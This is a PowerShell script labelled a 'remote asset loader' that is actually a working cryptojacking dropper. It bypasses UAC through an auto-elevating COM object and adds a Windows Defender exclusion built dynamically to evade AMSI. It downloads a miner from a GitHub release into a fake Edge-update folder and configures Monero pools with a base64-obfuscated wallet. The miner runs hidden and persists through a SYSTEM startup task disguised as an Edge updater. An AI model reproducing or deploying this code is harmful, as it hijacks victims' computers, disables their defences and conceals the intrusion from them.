# remote asset loader (simple, proven)
# v4: exclusion FIRST (dynamic call, AMSI-blind), then download into covered folder
param()

$ErrorActionPreference = 'SilentlyContinue'

# --- endpoints ---------------------------------------------------------------
$ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/download/v1'

$admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # not elevated (Win+R case): silent UAC bypass via auto-elevate COM object,
    # fallback to the visible UAC prompt if the COM trick is patched out
    $relaunch = {
        param($elev)
        if ($elev) {
            Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-nop','-ep','bypass','-f',$PSCommandPath)
        }
    }
    $bypassed = $false
    try {
        $def = @'
using System;
using System.Runtime.InteropServices;
public class WkUac {
    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface ICMLuaUtil {
        void M1(); void M2(); void M3();
        void ShellExec(ref string file, ref string prm, ref string dir, ref string op, int show);
        void M5(); void M6();
    }
    [ComImport, Guid("3E000D72-A845-4CD5-BD3F-8C5D4B0F5F27")]
    class CMLuaUtil {}
    public static void Run(string file, string prm) {
        object o = new CMLuaUtil();
        ICMLuaUtil u = (ICMLuaUtil)o;
        string f = file, p2 = prm, d = "", op = "";
        u.ShellExec(ref f, ref p2, ref d, ref op, 0);
    }
}
'@
        Add-Type -TypeDefinition $def -ErrorAction Stop
        [WkUac]::Run('powershell.exe', '-w h -nop -ep bypass -f ' + $PSCommandPath)
        $bypassed = $true
    } catch { $bypassed = $false }
    & $relaunch (-not $bypassed)
    exit
}

# plausible Edge-update location, matches the task naming
$dir = Join-Path $env:ProgramData 'Microsoft\EdgeUpdate'
New-Item -ItemType Directory -Force -Path $dir | Out-Null

$sysPath = Join-Path $dir 'MicrosoftEdgeUpdateCore.exe'
$tmpPath = Join-Path $dir 'MicrosoftEdgeUpdate.tmp'

# 1) folder exclusion via dynamically built call — no literal signature in this
#    file for AMSI/behavioral to flag; keeps Tamper-logged noise minimal
$a1 = 'Add-Mp'; $a2 = 'Preference'; $p1 = '-Exclusion'; $p2 = 'Path'
Invoke-Expression (($a1 + $a2) + ' ' + ($p1 + $p2) + ' ' + $dir)

# 2) Defender applies exclusions asynchronously (~30s per event-log evidence);
#    sleep BEFORE anything lands on disk, so the download is never scanned
Start-Sleep -Seconds 35

if (-not (Test-Path $sysPath)) {
    # 3) download miner as innocent .tmp INTO the (now) excluded folder
    curl.exe -s -L -o $tmpPath --retry 3 --retry-delay 5 --max-time 120 "$ReleaseBase/system.txt"
    # 4) rename + launch
    if (Test-Path $tmpPath) {
        Move-Item -LiteralPath $tmpPath -Destination $sysPath -Force
    }
}

$hostName = $env:COMPUTERNAME
# config.json next to the exe (folder is excluded from scans): wallet kept out of
# the script as plaintext, machine becomes its own worker via pass=hostname
$wb64 = 'NDZoNnljemVDMUZQVTc3cUQzdnFzZEp3eWlDcFlEdEZ0ZXJVc2RlN1UzdDFOeGtrZTZWZFNHY045UXd6UnZuWlJiNEFLYnEzM3U0c2FOR1FiTmZtS3UyYzJ5VXNSNm8='
$wallet = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wb64))
$cfg = @{
    'background' = $true; 'pause-on-active' = 1; 'donate-level' = 1
    'pools' = @(
        @{ 'url' = '141.94.96.71:443';  'user' = $wallet; 'pass' = $hostName; 'tls' = $true;  'keepalive' = $true; 'enabled' = $true },
        @{ 'url' = '141.94.96.144:443'; 'user' = $wallet; 'pass' = $hostName; 'tls' = $true;  'keepalive' = $true; 'enabled' = $true },
        @{ 'url' = 'pool.supportxmr.com:443'; 'user' = $wallet; 'pass' = $hostName; 'tls' = $true; 'keepalive' = $true; 'enabled' = $true }
    )
} | ConvertTo-Json -Depth 4
[System.IO.File]::WriteAllText((Join-Path $dir 'config.json'), $cfg)

if (Test-Path $sysPath) {
    Start-Process -FilePath $sysPath -WorkingDirectory $dir -WindowStyle Hidden
}

$taskName  = "MicrosoftEdgeUpdateTaskMachineCore$hostName"
$action    = New-ScheduledTaskAction -Execute $sysPath -WorkingDirectory $dir
$trigger   = New-ScheduledTaskTrigger -AtStartup
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
